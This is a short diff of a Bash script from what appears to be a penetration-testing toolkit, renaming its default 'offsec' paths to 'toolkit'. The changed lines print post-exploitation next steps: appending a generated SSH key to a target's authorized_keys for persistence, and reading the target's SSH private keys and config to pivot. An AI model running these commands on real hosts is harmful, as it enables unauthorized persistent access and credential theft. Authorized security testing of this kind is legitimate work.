@@ -53,10 +53,10 @@ disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' 
 if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
     if [[ -n "${SUDO_USER:-}" ]]; then
         _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
-        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
+        TOOLKIT_ROOT="${_inv_home:-$HOME}/toolkit"
         unset _inv_home
     else
-        TOOLKIT_ROOT="${HOME}/offsec"
+        TOOLKIT_ROOT="${HOME}/toolkit"
     fi
 fi
 
@@ -752,9 +752,9 @@ generate_next_steps() {
             echo "  ssh -J ${ssh_u}@${ssh_t} <internal_user>@<internal_host>"
             echo ""
             echo "# Key-based persistence (authorized_keys append if writable):"
-            echo "  ssh-keygen -t ed25519 -N '' -f /tmp/offsec_key"
-            echo "  cat /tmp/offsec_key.pub | ssh ${ssh_u}@${ssh_t} 'mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys'"
-            echo "  ssh -i /tmp/offsec_key ${ssh_u}@${ssh_t}"
+            echo "  ssh-keygen -t ed25519 -N '' -f /tmp/toolkit_key"
+            echo "  cat /tmp/toolkit_key.pub | ssh ${ssh_u}@${ssh_t} 'mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys'"
+            echo "  ssh -i /tmp/toolkit_key ${ssh_u}@${ssh_t}"
             echo ""
             echo "# Also check for in-home SSH private keys (pivot to other accounts/hosts):"
             echo "  ssh ${ssh_u}@${ssh_t} 'cat ~/.ssh/id_* 2>/dev/null; cat ~/.ssh/config 2>/dev/null'"
